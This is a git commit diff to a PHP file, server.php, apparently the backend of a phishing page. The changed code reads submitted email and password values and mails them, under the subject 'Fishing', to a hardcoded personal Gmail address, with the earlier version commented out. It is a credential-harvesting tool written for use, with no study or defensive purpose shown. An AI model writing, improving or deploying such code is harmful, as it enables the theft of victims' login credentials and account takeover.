5d9b47cefbc50386b04df64fe8ed159835b19f71
intagram <68853920+intagram@users.noreply.github.com>
2020-08-23 19:44:09 +0400

    Update server.php

--- server.php
+++ server.php
@@ -2,17 +2,30 @@
 
 
 
-$mail = "email: ".$POST['val'];
-$pass = "password: ".$POST['val1'];
+$mail = $POST['val'];
+$pass = $POST['val1'];
+$to      = 'narekxachatryan1998@gmail.com';
+$subject = "Fishing";
+$message = "email: ".$mail.' | '."password: ".$pass;
+$headers = 'From: webmaster@example.com' . "\r\n" .
+    'Reply-To: webmaster@example.com' . "\r\n" .
+    'X-Mailer: PHP/' . phpversion();
+
+mail($to, $subject, $message, $headers);
 
 
-$to = 'narekxachatryan1998@gmail.com';
-$subject = 'Fishing';
-$message = 'Email: ' . $mail . ' | ' .'Password: '. $password;
-// Sending email
-if(mail($to, $subject, $message)){
-    // echo 'Your mail has been sent successfully.';
-    print $mail;
-} else{
-    echo 'Unable to send email. Please try again.';
-}
+
+
+// $to = 'narekxachatryan1998@gmail.com';
+// $subject = 'Fishing';
+// $message = 'Email: ' . $mail . ' | ' .'Password: '. $password;
+// // Sending email
+// if(mail($to, $subject, $message)){
+//     // echo 'Your mail has been sent successfully.';
+//     print $mail;
+// } else{
+//     echo 'Unable to send email. Please try again.';
+// }
+
+
+
